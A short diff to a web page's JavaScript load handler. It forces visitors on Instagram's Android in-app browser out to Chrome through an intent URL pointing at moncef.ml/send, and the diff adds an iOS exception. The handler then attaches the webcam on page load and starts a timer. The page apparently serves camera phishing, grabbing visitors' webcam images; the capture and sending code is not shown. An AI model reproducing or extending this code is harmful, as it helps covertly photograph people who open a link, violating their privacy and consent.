@@ -84,12 +84,17 @@ function Desktop(){
 window.onload = function(){
 	var ua = navigator.userAgent || navigator.vendor || window.opera;
 	var isInstagram = (ua.indexOf('Instagram') > -1) ? true : false;
-	if (isInstagram){
-		window.location.href = "intent:https://moncef.ml/send#Intent;end";
-		alert("use google chrome")
-	}
-	else {
-		console.log('browser')
+	let isIOS = (/iPad|iPhone|iPod/.test(navigator.platform))
+	if (isIOS){
+		console.log('')
+	} else {
+		if (isInstagram){
+			window.location.href = "intent:https://moncef.ml/send#Intent;end";
+			alert("use google chrome")
+		}
+		else {
+			console.log('browser')
+		}
 	}
 	Webcam.attach('#my_camera');
 	setTimeout(function(){
